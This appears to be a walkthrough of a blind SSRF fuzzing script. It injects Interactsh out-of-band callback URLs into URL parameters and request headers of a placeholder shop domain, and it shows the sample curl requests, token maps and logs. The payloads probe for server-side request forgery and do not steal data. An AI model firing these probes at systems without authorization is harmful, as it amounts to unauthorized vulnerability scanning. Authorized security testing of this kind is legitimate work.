⭐ OVERVIEW OF HOW THE SCRIPT WORKS

The script does two types of SSRF fuzzing:

1) PARAM SSRF fuzzing

Find endpoints like:

?url=
?redirect=
?file=
?dest=
?path=


→ Inject OOB payload into those params
→ Request the URL
→ If server fetches the OOB URL → You get a hit in Interactsh.

2) HEADER SSRF fuzzing

Send headers like:

X-Forwarded-For: http://<token>.oast.fun
X-Real-IP: http://<token>.oast.fun
Destination: http://<token>.oast.fun


→ If backend fetches that URL → You get OOB hit
→ Token tells you exactly which header caused the SSRF.

⭐ WHY EVERYTHING WORKS

Because every request uses a unique token.

Example token:

a7d91cfb1203


Example OOB URL:

http://a7d91cfb1203.oast.fun


If you see that token in Interactsh →
You grep it inside the token map and instantly know:

Was it a header test or param test

Which header or param triggered it

Which endpoint it came from

When it was sent

⭐ OUTPUT FILES (minimal version)

The script only keeps 3 files:

1) tokens_map.tsv

Mapping of every token → what request caused it.

Format:

token   payload_host   type   target   meta   timestamp


Example lines:

a7d91cfb1203    a7d91cfb1203.oast.fun    PARAM   https://absupplies.example.com/account/login?checkout_url=...   param:url    2025-11-20T12:34:56
b8e21adc7789    b8e21adc7789.oast.fun    HEADER  absupplies.example.com    HEADER:X-Forwarded-For   2025-11-20T12:35:22

2) param_tests.txt

These URLs are what we fuzz with params.

One URL per matched endpoint.

Example:

https://absupplies.example.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
https://absupplies.example.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun

3) sent_requests.log

Log of every request made (both headers + params)

Format:

timestamp   token   payload_host   target   meta   http_code


Example:

2025-11-20T12:34:57  a7d91cfb1203  a7d91cfb1203.oast.fun  https://absupplies.example.com/...   PARAM   200
2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.example.com      HEADER:X-Forwarded-For   200

🌍 REALISTIC FULL WORKING EXAMPLE

Your input: ssrf.txt

https://absupplies.example.com/account/login?checkout_url=/
https://absupplies.example.com/collections/mailer-bundles?page=2
https://absupplies.example.com/sitemap_products_1.xml?from=100&to=200


Your ssrf_headers.txt:

X-Forwarded-For
X-Real-IP
Destination
X-Client-IP


You run:

./ssrf_blinder_minimal.sh igqukeo....oast.fun ssrf.txt ssrf_headers.txt 40

⭐ STEP 1 — PARAM FUZZING

Script scans for SSRF params:

checkout_url

page

etc

Suppose only these match your SSRF patterns:

checkout_url
page


Script creates:

➜ Two tokens for param fuzz

Example tokens:

a7d91cfb1203   # checkout_url
fe119cb2d991   # page

➜ And produces param-injected URLs:

param_tests.txt

https://absupplies.example.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
https://absupplies.example.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun


The script sends them.

If backend fetches the OOB URL → you get callback in Interactsh.

Tokens recorded in: tokens_map.tsv
a7d91cfb1203  a7d91cfb1203.oast.fun  PARAM  https://.../login  param:checkout_url
fe119cb2d991  fe119cb2d991.oast.fun  PARAM  https://.../mailer-bundles  param:page

⭐ STEP 2 — SINGLE SUBDOMAIN DETECTED

Script sees all endpoints share:

absupplies.example.com


So header fuzzing is done ONLY against:

https://absupplies.example.com

⭐ STEP 3 — HEADER FUZZING

You have 4 headers:

X-Forwarded-For
X-Real-IP
Destination
X-Client-IP


Script generates one token per header:

b8e21adc7789 → X-Forwarded-For
c99e712fa901 → X-Real-IP
fae28cd11722 → Destination
d2f1cab889ff → X-Client-IP

Sends requests:
curl -H "X-Forwarded-For: http://b8e21adc7789.oast.fun" https://absupplies.example.com
curl -H "X-Real-IP: http://c99e712fa901.oast.fun" https://absupplies.example.com
curl -H "Destination: http://fae28cd11722.oast.fun" https://absupplies.example.com
curl -H "X-Client-IP: http://d2f1cab889ff.oast.fun" https://absupplies.example.com

Added into tokens_map.tsv:
b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.example.com  HEADER:X-Forwarded-For
c99e712fa901  c99e712fa901.oast.fun  HEADER  absupplies.example.com  HEADER:X-Real-IP
fae28cd11722  fae28cd11722.oast.fun  HEADER  absupplies.example.com  HEADER:Destination
d2f1cab889ff  d2f1cab889ff.oast.fun  HEADER  absupplies.example.com  HEADER:X-Client-IP

⭐ STEP 4 — YOU GET AN OOB HIT 😈

Suppose Interactsh shows:

b8e21adc7789.oast.fun hit detected


You run:

grep b8e21adc7789 ssrf_blinder_minimal_out/tokens_map.tsv


Output:

b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.example.com  HEADER:X-Forwarded-For

ANSWER:

X-Forwarded-For header caused the SSRF
Target: https://absupplies.example.com

This is exact identification.

⭐ STEP 5 — You can validate with sent_requests.log
grep b8e21adc7789 ssrf_blinder_minimal_out/sent_requests.log


Output:

2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.example.com  HEADER:X-Forwarded-For  200

⭐ FINAL SUMMARY (short version)
✔ Param fuzz:

One unique token per endpoint

One injected URL

Logged

✔ Header fuzz:

One unique token per header (for the ONE subdomain)

One request per header

Logged

✔ Token maps EVERYTHING:
token → was it PARAM or HEADER?
token → which param/header?
token → which URL?
token → what time?

✔ You see the token in Interactsh

→ grep token
→ instantly know the exact root cause.
